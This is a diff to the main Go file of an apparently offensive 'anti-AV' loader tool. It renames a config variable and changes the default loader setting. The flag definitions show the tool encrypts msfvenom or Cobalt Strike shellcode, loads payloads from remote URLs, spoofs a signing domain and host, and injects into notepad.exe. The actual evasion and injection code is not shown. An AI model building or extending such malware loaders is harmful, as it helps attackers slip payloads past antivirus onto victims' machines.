@@ -9,35 +9,34 @@ import (
 )
 
 var (
-	mAv = config{
+	antiAV = config{
 		loader: "normal",
 	}
 )
 
 func main() {
 	initialize()
-	mAv.build()
+	antiAV.build()
 }
 
 func initialize() {
-	flag.StringVar(&mAv.loader, "l", "binary", "loader: binary")
-	flag.StringVar(&mAv.shellcode, "sc", "payload.e", "encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading")
-	flag.StringVar(&mAv.os, "os", "windows", "OS: windows,linux")
-	flag.StringVar(&mAv.domain, "domain", "baidu.com", "domain to be signed")
-	flag.StringVar(&mAv.hostObfuscator, "ho", "wwww.baidu.com", "host obfuscator")
-	flag.BoolVar(&mAv.crypt, "e", false, "payload to be encrypted")
-	flag.BoolVar(&mAv.inject, "inject", false, "inject payload to notepad.exe")
+	flag.StringVar(&antiAV.loader, "l", "sc", "loader: binary")
+	flag.StringVar(&antiAV.shellcode, "sc", "payload.e", "encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading")
+	flag.StringVar(&antiAV.os, "os", "windows", "OS: windows,linux")
+	flag.StringVar(&antiAV.domain, "domain", "baidu.com", "domain to be signed")
+	flag.StringVar(&antiAV.hostObfuscator, "ho", "wwww.baidu.com", "host obfuscator")
+	flag.BoolVar(&antiAV.crypt, "e", false, "payload to be encrypted")
+	flag.BoolVar(&antiAV.inject, "inject", false, "inject payload to notepad.exe")
 	flag.Parse()
 
-	if err := mAv.validate(); err != nil {
-		logrus.Error(err.Error())
+	if err := antiAV.validate(); err != nil {
+		logrus.Error("[-]", err.Error())
 		os.Exit(0)
 	}
 
 	logrus.SetFormatter(&logrus.TextFormatter{
 		DisableColors:          false,
 		DisableTimestamp:       true,
-		PadLevelText:           true,
 		FullTimestamp:          false,
 		DisableLevelTruncation: false,
 	})
@@ -46,7 +45,7 @@ func initialize() {
 
 func (c *config) validate() error {
 	switch c.loader {
-	case "binary":
+	case "sc":
 	default:
 		return fmt.Errorf("not Support Loader: %v", c.loader)
 	}
